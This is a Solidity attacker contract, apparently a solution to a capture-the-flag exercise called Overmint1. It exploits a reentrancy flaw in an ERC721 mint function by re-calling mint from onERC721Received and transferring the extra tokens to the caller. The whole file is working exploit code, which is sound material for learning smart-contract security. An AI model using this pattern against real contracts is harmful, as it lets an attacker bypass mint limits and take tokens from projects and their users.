// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.15;
import "@openzeppelin/contracts/token/ERC721/ERC721.sol";
import "./Overmint1.sol";

/*
Reentrancy attack - contract doesn't follow checks-effects-interactions,
the effects come after the interaction, so reenter on onERC721Received
*/

contract Overmint1Attacker {
    Overmint1 private om;
    uint8 callCount;

    constructor(address _victimContract) {
        om = Overmint1(_victimContract);
    }

    function attack() external {
        callCount++;
        om.mint();
        om.transferFrom(address(this), msg.sender, 1);
        om.transferFrom(address(this), msg.sender, 2);
        om.transferFrom(address(this), msg.sender, 3);
        om.transferFrom(address(this), msg.sender, 4);
        om.transferFrom(address(this), msg.sender, 5);
    }

    function onERC721Received(address, address, uint256, bytes calldata) external returns (bytes4) {
        // Reentrancy here - call mint again
        if (callCount < 5) {
            callCount++;
            om.mint();
        }
        return IERC721Receiver.onERC721Received.selector;
    }
}
